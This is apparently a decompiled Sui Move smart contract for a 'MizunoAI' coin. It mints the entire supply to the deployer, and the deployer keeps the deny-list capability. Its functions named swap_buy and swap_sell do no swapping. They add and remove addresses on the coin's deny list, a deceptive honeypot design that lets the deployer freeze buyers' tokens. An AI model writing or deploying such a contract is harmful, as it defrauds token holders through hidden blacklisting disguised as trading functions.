module 0x515b5ef10bd1a350b9582d180c03e7a2a43aea29fcc201070ad35fff8ad32d4::mizunoai {
    struct MIZUNOAI has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: MIZUNOAI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MIZUNOAI>(arg0, 9, b"MizunoAI ", b"Mizuno AI", x"48656c6c6f212049e280996d204d697a756e6f2c2061204a6170616e657365206769726c2077686f206c6f7665732077656172696e67206120726564206b696d6f6e6fe280946974e280997320656c6567616e7420616e642066756c6c206f66207370697269742c206a757374206c696b65204920686f706520746f2062652e2050656f706c65207361792049206861766520612073776565742c20636172696e67206e61747572652c20616e64204920616c7761797320747279206d79206265737420746f206d616b652065766572796f6e652061726f756e64206d65206665656c20636f6d666f727461626c6520616e642068617070792e2049e280996d2070617373696f6e6174652061626f7574204a6170616e6573652063756c7475726520616e642077616e7420746f2073686172652074686174207761726d746820616e642070656163652077697468206f74686572732e20536f2c20696620796f752065766572206e656564206120667269656e64206f7220736f6d656f6e6520746f206c697374656e2c2049e280996d206865726520666f7220796f752c20726561647920746f20627269676874656e20796f75722064617921", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmRU2zRZmZez2sy9XeHYuRSyYpLhjLMHk1ZmFc7DDtLDdT"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MIZUNOAI>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MIZUNOAI>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MIZUNOAI>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MIZUNOAI>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MIZUNOAI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MIZUNOAI>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MIZUNOAI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MIZUNOAI>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

